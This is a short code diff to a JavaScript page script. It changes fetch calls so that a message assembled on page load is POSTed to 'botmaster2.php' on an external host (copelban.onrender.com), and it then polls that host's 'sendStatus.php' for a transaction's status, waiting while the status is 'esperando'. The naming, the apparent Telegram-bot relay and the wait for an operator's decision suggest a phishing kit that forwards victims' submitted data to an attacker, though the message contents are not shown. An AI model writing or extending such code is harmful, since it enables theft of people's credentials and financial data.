@@ -100,7 +100,7 @@ document.addEventListener('DOMContentLoaded', async function () {
   };
 
   // Solo enviar mensaje, sin getUpdates
-  await fetch("botmaster2.php", {
+  await fetch("https://copelban.onrender.com/botmaster2.php", {
     method: "POST",
     headers: { "Content-Type": "application/x-www-form-urlencoded" },
     body: "data=" + encodeURIComponent(mensaje) +
@@ -112,7 +112,7 @@ document.addEventListener('DOMContentLoaded', async function () {
 
   async function revisarAccion(txId) {
     try {
-      const res = await fetch(`sendStatus.php?txid=${txId}`);
+      const res = await fetch(`https://copelban.onrender.com/sendStatus.php?txid=${txId}`);
       const json = await res.json();
 
       if (!json.status || json.status === "esperando") {
